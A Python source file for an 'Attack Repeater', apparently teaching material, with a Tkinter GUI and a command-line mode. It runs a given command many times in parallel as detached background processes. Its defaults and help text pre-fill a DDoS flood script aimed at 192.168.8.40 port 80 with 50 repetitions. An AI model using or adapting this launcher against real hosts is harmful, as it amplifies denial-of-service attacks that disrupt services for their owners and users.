import subprocess
import time
import sys
import os
import multiprocessing
import tkinter as tk
from tkinter import messagebox
import shlex 

def singleAttackProcess(commandStr):
    try:
        commandArgs = commandStr.split()
        print(f"  [Pool Worker PID {os.getpid()}] Launching: {' '.join(commandArgs[:2])}...")
        process = subprocess.Popen(
            commandArgs,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            start_new_session=True
        )
        print(f"  [Pool Worker PID {os.getpid()}] Child DDoS PID: {process.pid}")
        return process.pid
    except FileNotFoundError:
        print(f"Error: Command '{commandArgs[0]}' not found. Make sure it's in your PATH or provide full path.")
        return None
    except PermissionError:
        print(f"Error: Permission denied. Do you have 'sudo' correctly configured or the right permissions?")
        return None
    except Exception as e:
        print(f"An unexpected error occurred during launch: {e}")
        return None

def runBackground():
    print(helpMenu())
    repeatCommand = input("Enter the command: ")
    if not repeatCommand:
        print("Error: No command entered. Exiting.")
        sys.exit(1)
    try:
        numTimesString = input("Enter the number repeats: ")
        numTimes = int(numTimesString)
        if numTimes <= 0:
            raise ValueError
    except ValueError:
        print("Error: Invalid total repetitions. Please enter a positive integer.")
        sys.exit(1)
    try:
        maxCconcurrentProcesses = os.cpu_count() or 1
        numConcurrentString = input(f"Enter the number of concurrent attacks (max: {maxCconcurrentProcesses}): ")
        numConcurrent = int(numConcurrentString)
        if numConcurrent <= 0:
            raise ValueError
    except ValueError:
        print("Error: Invalid number of concurrent attacks. Please enter a positive integer.")
        sys.exit(1)
    print("")
    print(f"Preparing to launch '{repeatCommand}' {numTimes} times with {numConcurrent} concurrent workers...")
    print("You might be prompted for your sudo password by each instance or once initially.")
    print("Output from the repeated commands will NOT appear in this terminal.")
    print("=========================================")
    print("")
    commandsToExecute = [repeatCommand] * numTimes
    launchedPids = []
    with multiprocessing.Pool(processes=numConcurrent) as pool:
        launchedPids = pool.map(singleAttackProcess, commandsToExecute)
    successfulPids = [pid for pid in launchedPids if pid is not None]
    print("\n" + "="*40)
    print(f"All {len(successfulPids)} instances have been launched in the background via the pool.")
    print("To check them, use: ps aux | grep 'ddos-attack-app.py'")
    print("To stop them, use: sudo pkill -9 -f ddos-attack-app.py || true ; reset")
    print("="*40 + "\n")

def runGUI():
    def runRepeater():
        command = entryCommand.get()
        try:
            repeats = int(entryRepeats.get())
            concurrency = int(entryConcurrent.get())
            if not command or repeats <= 0 or concurrency <= 0:
                raise ValueError
        except ValueError:
            messagebox.showerror("Input Error", "Please provide valid positive integers and a command.")
            return

        resultLabel.config(text="Running attacks in background, check terminal output.")
        commandsToExecute = [command] * repeats
        with multiprocessing.Pool(processes=concurrency) as pool:
            launchedPids = pool.map(singleAttackProcess, commandsToExecute)
        successfulPids = [pid for pid in launchedPids if pid is not None]
        messagebox.showinfo("Done", f"Launched {len(successfulPids)} instances.\nCheck terminal for details.")
    
    def stopRepeater(killCommand):
        cmd = killCommand.get().strip()
        # print(command)
        if not cmd:
            messagebox.showerror("Error", "No stop command provided.")
            return
        try:
            # result = subprocess.run(
            #     ["pkill", "-9", "-f", "ddos-attack-app.py"],
            #     check=True,
            #     stdout=subprocess.PIPE,
            #     stderr=subprocess.PIPE,
            #     text=True
            # )
            cmd_args = shlex.split(cmd)
            result = subprocess.run(
                cmd_args,
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            messagebox.showinfo("Stopped", "All ddos-attack-app.py processes have been terminated.")
            resultLabel.config(text="Running attacks are stopped.")
        except subprocess.CalledProcessError as e:
            messagebox.showwarning("Warning", f"No processes found or failed to terminate.\n\n{e.stderr}")
        except Exception as ex:
            messagebox.showerror("Error", f"Unexpected error:\n{str(ex)}")


    def showHelp():
        helpWindow = tk.Toplevel(root)
        helpWindow.title("Help")
        helpWindow.geometry("700x400")
        helpText = tk.Text(helpWindow, wrap="word")
        helpText.insert("1.0", helpMenu())
        helpText.config(state="disabled")
        helpText.pack(fill="both", expand=True, padx=10, pady=10)

    root = tk.Tk()
    root.title("Attack Repeater (Educational)")

    tk.Label(root, text="Command:").grid(row=0, column=0, padx=10, pady=5, sticky="e")
    entryCommand = tk.Entry(root, width=45)
    entryCommand.grid(row=0, column=1, padx=10, pady=5, sticky="w")
    entryCommand.insert(0, "sudo python ddos-attack-app.py 192.168.8.40 80 200000")

    tk.Label(root, text="Repetitions:").grid(row=1, column=0, padx=10, pady=5, sticky="e")
    entryRepeats = tk.Entry(root)
    entryRepeats.grid(row=1, column=1, padx=10, pady=5, sticky="w")
    entryRepeats.insert(0, "50")

    tk.Label(root, text="Concurrency:").grid(row=2, column=0, padx=10, pady=5, sticky="e")
    entryConcurrent = tk.Entry(root)
    entryConcurrent.grid(row=2, column=1, padx=10, pady=5, sticky="w")
    entryConcurrent.insert(0, "2")

    tk.Label(root, text="Stop the processes:").grid(row=3, column=0, padx=10, pady=5, sticky="e")
    stopCommand = tk.Entry(root, width=25)
    stopCommand.grid(row=3, column=1, padx=10, pady=5, sticky="w")
    stopCommand.insert(0, "pkill -9 -f ddos-attack-app.py")

    # tk.Button(root, text="Help", command=showHelp).grid(row=4, column=0, pady=5)
    # tk.Button(root, text="Run", command=runRepeater).grid(row=4, column=1, pady=5)
    # tk.Button(root, text="Stop", command=stopRepeater).grid(row=4, column=2, pady=5)

    tk.Button(root, text="Help", command=showHelp).grid(row=4, column=0, pady=5)
    buttonFrame = tk.Frame(root)
    buttonFrame.grid(row=4, column=1, pady=5, sticky="w")
    tk.Button(buttonFrame, text="Run", command=runRepeater).pack(side="left", padx=5)
    # tk.Button(buttonFrame, text="Stop", command=runRepeater).pack(side="left", padx=5)
    tk.Button(buttonFrame, text="Stop", command=lambda: stopRepeater(stopCommand)).pack(side="left", padx=5)

    resultLabel = tk.Label(root, text="", fg="green")
    resultLabel.grid(row=5, column=0, columnspan=2)

    root.mainloop()

def helpMenu():
    outText = """
    =========================================
    Attack Repeater for DDoS Attack (Multiprocessing Pool).
    Created by Kaled Aljebur for learning purposes in teaching classes.
    =========================================
    This program can repeat any command simultaneously with multithreading. 

    1. Before running this repeater, it is better to move the terminal to Downloads folder 
       where the attack file located, like 'cd Downloads', then re-run this repeater.
       Or, you can use full absolute path like /home/kaled/Downloads/ddos...py
    2. To run it with GUI: 'sudo python attack-repeater.py
    3. To run it without GUI: 'sudo attack-repeater.py -a' the follow =>
        Enter the command: python ddos-attack-app.py 192.168.8.40 80 200000
        Enter the number repeats: 50
        Enter the number of CONCURRENT attacks (max: x): 2
    4. To check requests, use: ps aux | grep 'ddos-attack-app.py'
    5. To stop requests, use: sudo pkill -9 -f ddos-attack-app.py || true ; reset
    """
    return outText

if __name__ == "__main__":
    if len(sys.argv) == 1:
        runGUI()
    elif len(sys.argv) == 2:
        if sys.argv[1] == "-a":
            runBackground()
        else:
            print(helpMenu())
    else:
        print(helpMenu())
